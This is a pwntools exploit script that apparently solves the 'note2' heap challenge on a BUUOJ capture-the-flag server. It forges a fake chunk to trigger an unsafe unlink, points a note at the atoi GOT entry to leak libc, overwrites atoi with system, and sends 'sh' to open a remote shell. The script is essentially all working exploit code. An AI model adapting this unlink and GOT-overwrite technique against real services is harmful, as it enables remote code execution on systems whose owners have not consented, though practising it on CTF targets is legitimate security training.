from pwn import *

#context.log_level = 'debug'

#p = process('./note2')
p = remote('node4.buuoj.cn', 26784)
elf = ELF('note2')
libc = ELF('libc-2.23.buu.so')

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + '\n' + s)

def alloc(size, content):
    p.sendlineafter(b'>>\n', b'1')
    p.sendlineafter(b'n 128)\n', str(size).encode())
    p.sendlineafter(b'content:\n', content)

def show(index):
    p.sendlineafter(b'>>\n', b'2')
    p.sendlineafter(b'note:\n', str(index).encode())

def overwrite(index, content):
    p.sendlineafter(b'>>\n', b'3')
    p.sendlineafter(b'the note:\n', str(index).encode())
    p.sendlineafter(b'pend]\n', b'1')
    p.sendlineafter(b'tents:', content)

def append(index, content):
    p.sendlineafter(b'>>\n', b'3')
    p.sendlineafter(b'the note:\n', str(index).encode())
    p.sendlineafter(b'pend]\n', b'2')
    p.sendlineafter(b'tents:', content)

def delete(index):
    p.sendlineafter(b'>>\n', b'4')
    p.sendlineafter(b'note:\n', str(index).encode())

p.sendline(b'Yeuoly')
p.sendline(b'ovo')

heaparray = 0x602120

#unlink
payload = p64(0) + p64(0x41) + p64(heaparray - 0x18) + p64(heaparray - 0x10)
alloc(0x20, payload) #0
alloc(0x00, b'a') #1
alloc(0x80, b'a') #2
delete(1) #0
alloc(0x00, b'a' * 0x10 + p64(0x40) + p64(0x90)) #3
delete(2)

#leak libc
overwrite(0, b'a' * 0x18 + p64(elf.got['atoi']))

show(0)

atoi_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc_base = atoi_addr - libc.sym['atoi']

print('[+] libc_base -> {}'.format(hex(libc_base)))

system = libc_base + libc.sym['system']

overwrite(0, p64(system))

p.sendlineafter(b'>>\n', b'sh\0')

p.interactive()